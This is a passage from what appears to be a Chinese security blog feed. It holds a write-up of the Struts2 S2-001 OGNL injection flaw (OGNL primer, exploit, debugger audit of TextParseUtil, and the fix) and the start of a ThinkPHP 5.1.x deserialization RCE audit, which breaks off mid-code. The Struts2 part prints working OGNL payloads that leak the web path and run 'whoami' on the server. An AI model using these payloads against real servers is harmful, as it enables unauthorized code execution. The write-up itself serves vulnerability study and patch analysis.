    <content type="html"><![CDATA[<h3 id="ognl表达式"><a class="markdownIt-Anchor" href="#ognl表达式">#</a> OGNL 表达式</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)</span><br><span class="line"></span><br><span class="line">1、表达式（Expression）</span><br><span class="line"></span><br><span class="line">表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL 操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者 department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多。</span><br><span class="line"></span><br><span class="line">2、根对象（Root Object）</span><br><span class="line"></span><br><span class="line">根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user 就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department 中的 name 属性值）。</span><br><span class="line"></span><br><span class="line">3、上下文环境（Context）</span><br><span class="line"></span><br><span class="line">有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL 的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL 的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。</span><br><span class="line">OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root</span><br><span class="line">Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root</span><br><span class="line">Object）的存取操作的表达式是不需要增加 #符号进行区分的。</span><br></pre></td></tr></table></figure><p>对表达式的简单使用说明</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1. 基本对象树的访问</span><br><span class="line">对象树的访问就是通过使用点号将对象的引用串联起来进行。</span><br><span class="line">例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx</span><br><span class="line"></span><br><span class="line">2. 对容器变量的访问</span><br><span class="line">对容器变量的访问，通过#符号加上表达式进行。</span><br><span class="line">例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx</span><br><span class="line"></span><br><span class="line">3. 使用操作符号</span><br><span class="line">OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in等。</span><br><span class="line"></span><br><span class="line">4. 容器、数组、对象</span><br><span class="line">OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]</span><br><span class="line">同时，OGNL支持对Map的按键值查找：</span><br><span class="line">例如：#session[&#x27;mySessionPropKey&#x27;]</span><br><span class="line">不仅如此，OGNL还支持容器的构造的表达式：</span><br><span class="line">例如：&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;构造一个List，#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;构造一个Map</span><br><span class="line">你也可以通过任意类对象的构造函数进行对象新建</span><br><span class="line">例如：new Java.net.URL(&quot;xxxxxx/&quot;)</span><br><span class="line"></span><br><span class="line">5. 对静态方法或变量的访问</span><br><span class="line">要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：</span><br><span class="line"></span><br><span class="line">6. 方法调用</span><br><span class="line">直接通过类似Java的方法调用方式进行，你甚至可以传递参数：</span><br><span class="line">例如：user.getName()，group.users.size()，group.containsUser(#requestUser)</span><br><span class="line"></span><br><span class="line">7. 投影和选择</span><br><span class="line">OGNL支持类似数据库中的投影（projection） 和选择（selection）。</span><br><span class="line">投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.&#123;XXX&#125;，其中XXX 是这个集合中每个元素的公共属性。</span><br><span class="line">例如：group.userList.&#123;username&#125;将获得某个group中的所有user的name的列表。</span><br><span class="line">选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.&#123;X YYY&#125;，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：</span><br><span class="line">? 选择满足条件的所有元素</span><br><span class="line">^ 选择满足条件的第一个元素</span><br><span class="line">$ 选择满足条件的最后一个元素</span><br><span class="line">例如：group.userList.&#123;? #txxx.xxx != null&#125;将获得某个group中user的name不为空的user的列表。</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h3><p>获取 web 路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149936.png" alt="image-20230605114857778"></p><p>rce</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149921.png" alt="image-20230605114921788"></p><h3 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计">#</a> 代码审计</h3><p>漏洞点：</p><p>xwork-2.0.3-sources.jar!\com\opensymphony\xwork2\util\TextParseUtil.java</p><p>在 while 下打上断点</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149965.png" alt="image-20230605114938789"></p><p>这里为了方便我就把执行换成 username</p><p>debug 三轮，index.jsp→login→name→%{name} 就到了</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149702.png" alt="image-20230605114950361"> 首先是遍历 expression:login</p><p>接着就是 username</p><p>开始分析</p><p>走到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br></pre></td></tr></table></figure><p 1+2="">获得对象 o，值为 %</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150064.png" alt="image-20230605115003612">o 对象不为空进入循环</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150771.png" alt="image-20230605115016574"></p><p>再进入 TextUtils.stringSet 检查字符串是否设置为 null 或””</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stringSet</span><span class="params">(String string)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (string != <span class="literal">null</span>) &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(string);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其实第一次看到这个方法以为是 String 值设置，直接返回空？</p><p>但是注释写的是判断。。。</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150025.png" alt="image-20230605115032838"></p><p 1+2="">然后从这一步开始，值就被解析为 %</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150708.png" alt="image-20230605115050580"></p><p>再一次循环就解析结果了</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051151721.png" alt="image-20230605115101579"></p><p>实际上就是 translateVariables 下，递归解析 OGNL 表达式，对输入的 %{1+2} 继续解析导致被恶意利用</p><h3 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复">#</a> 漏洞修复</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, <span class="type">int</span> maxLoopCount)</span> &#123;</span><br><span class="line">    <span class="comment">// deal with the &quot;pure&quot; expressions first!</span></span><br><span class="line">    <span class="comment">//expression = expression.trim();</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line">    <span class="type">int</span> <span class="variable">loopCount</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>, pos);</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>) &#123;</span><br><span class="line">            pos = <span class="number">0</span>;</span><br><span class="line">            loopCount++;</span><br><span class="line">            start = expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> end;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        end = x - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((start != -<span class="number">1</span>) &amp;&amp; (end != -<span class="number">1</span>) &amp;&amp; (count == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">            <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">            <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">middle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">                middle = o.toString();</span><br><span class="line">                <span class="keyword">if</span> (!TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = left + middle;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + middle + right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// the variable doesn&#x27;t exist, so don&#x27;t display anything</span></span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">            pos = (left != <span class="literal">null</span> &amp;&amp; left.length() &gt; <span class="number">0</span> ? left.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  (middle != <span class="literal">null</span> &amp;&amp; middle.length() &gt; <span class="number">0</span> ? middle.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  <span class="number">1</span>;</span><br><span class="line">            pos = Math.max(pos, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断了循环的次数，从而在解析到 %{1+1} 的时候不会继续向下递归</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ognl表达式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ognl表达式&quot;&gt;#&lt;/a&gt; OGNL 表达式&lt;/h3&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="Struts2" scheme="https://ki10moc.github.io/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.xRCE漏洞</title>
    <link href="https://ki10moc.github.io/2023/01/12/ThinkPHP5.1.xRCE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://ki10moc.github.io/2023/01/12/ThinkPHP5.1.xRCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-01-11T16:29:17.000Z</published>
    <updated>2023-01-14T04:20:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2><p>整个流程理解上可能不是很复杂，但我感觉想把整个 exp 写下来还是有点复杂的，中间 debug 的过程还是需要花时间去考究的。</p><h2 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计">#</a> 代码审计</h2><p>入口点依然是 <code>windows.php</code>  下的 <code>__destruct</code></p><p><img src="https://img-blog.csdnimg.cn/000ee35d7ec348a79180a3a4cf45a49c.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[Pure</span>(<span class="literal">true</span>)<span class="meta">]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_exists</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$filename</span></span>): <span class="title">bool</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>file_exists</code>  会将文件名当做字符串，这里接着寻找 <code>__toString</code>  方法<br>在 5.0 版本是在 <code>Model</code>  类<br>在 5.1 版本是在 <code>Conversion</code>  类</p><p>一路跟进到 <code>toArray</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>       = [];</span><br><span class="line">        <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span 